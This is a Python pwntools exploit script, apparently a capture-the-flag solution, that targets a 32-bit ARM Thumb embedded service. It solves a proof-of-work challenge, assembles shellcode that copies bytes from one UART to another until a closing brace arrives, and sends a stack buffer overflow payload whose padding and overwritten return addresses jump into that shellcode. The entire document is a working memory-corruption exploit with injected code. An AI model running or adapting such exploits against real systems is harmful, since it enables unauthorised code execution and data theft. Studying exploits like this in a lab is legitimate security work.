#!/usr/bin/python3

from pwn import *
import subprocess
import sys
import time

context.arch = 'thumb'
context.bits = 32
context.endian = 'little'

rem = False
host = "localhost"
port = 1338

if len(sys.argv) > 1:
	if sys.argv[1] == "rem":
		host = "91.98.131.46"
		rem = True

r = remote(host, port)

def pow_solve():
	r.recvuntil(b'unhex("')

	num = r.recvline().split(b'"')[0]

	print(f"[*] Retrieved num: {num}")

	result = subprocess.run(
	    ["./pow-solver", "30", num.decode()], 
	    capture_output=True, 
	    text=True
	)

	if result.returncode == 0:
	    pow_result = result.stdout.strip()
	    print(f"Result: {pow_result}")
	else:
	    print(f"Error: {result.stderr}")
	    sys.exit(1)

	print(f"[+] Sending {pow_result.encode()}")
	r.sendline(pow_result.encode())

if rem:
	pow_solve()

code = asm("""
		ldr r3, =0x0
		ldr r5, =0x7d
	start:
		movw r4, 0xffff
		movt r4, 0x00ff
	delay:
		subs r4, 1
		cmp r4, r3
		bne delay
	loop:
	    ldr r0, =0x4000D000  
	    ldr r1, [r0]    
	    tst r1, #0xFF        
	    beq start    

	    ldr r2, =0x4000C000  
	    str r1, [r2]
	    cmp r1, r5
	    beq end         
	    b start
	end:               
	""")

seed = 0x7ffde650

off = 4 * 4 * 8 + (3 * 4)
buf = 0x2000ff58
uart1 = 0x4000d000
needle = b'I am enlightened'

r.recvuntil(b'possible')
payload = b'C' * len(needle)
payload += code
payload = payload.ljust(off, b'\x41')
payload += p32(buf)
payload += b'CCCC' + p32(buf+0x11)

r.sendline(payload)

r.recvuntil(b'possible')
r.sendline(needle + code)

r.interactive()